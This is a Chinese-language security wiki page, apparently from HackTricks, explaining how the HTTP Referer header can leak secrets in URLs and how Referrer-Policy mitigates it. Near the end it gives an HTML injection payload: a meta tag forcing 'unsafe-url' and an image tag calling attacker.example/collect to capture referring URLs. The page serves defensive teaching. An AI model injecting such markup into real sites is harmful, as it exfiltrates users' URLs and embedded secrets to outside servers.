# 有趣的 HTTP 行为

{{#include ../banners/hacktricks-training.md}}

## `Referer` 请求头与 Referrer Policy

HTTP `Referer` 请求头标识发起资源请求的绝对或部分 URL。根据当前启用的 referrer policy，它可以包含 referring origin、路径和 query string，但不包含 URL fragment。<sup>[[1]](#references)</sup>

### 敏感信息泄露

URL 路径或 query parameters 中的 secrets 可能通过浏览器历史记录、日志、analytics、复制的链接以及 `Referer` 请求头泄露。因此，cross-origin 链接或 subresource 请求可能会将 referring URL 暴露给外部服务器。<sup>[[2]](#references)</sup>

### 缓解措施

使用 `Referrer-Policy` 响应头控制浏览器发送的 referrer 信息量。`strict-origin-when-cross-origin` 是浏览器中的现代默认值，而 `no-referrer` 会完全抑制该请求头；应选择符合应用需求的 policy。<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
不要将密码、会话标识符、API keys 或其他敏感值放入 URLs 中。应通过 TLS 在适当的请求 headers 或请求 bodies 中发送它们。<sup>[[2]](#references)</sup>

### HTML Injection 注意事项

文档还可以使用 `<meta name="referrer">` 设置适用于整个页面的策略。如果 HTML injection 漏洞允许攻击者插入一个有效的 meta 元素，攻击者可能会尝试削弱文档对后续请求的策略。动态注入或相互冲突的 meta 策略可能表现得不可预测，因此应在目标浏览器中验证其行为，而不是假设响应 header 始终会被覆盖。<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
修复底层的 HTML injection，并避免将敏感数据放入 URL；referrer policy 是 defense in depth，不能替代这两项控制。

## References

- [1] [MDN - `Referer` 请求头](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - 使用带敏感查询字符串的 GET 请求方法](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` 请求头](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
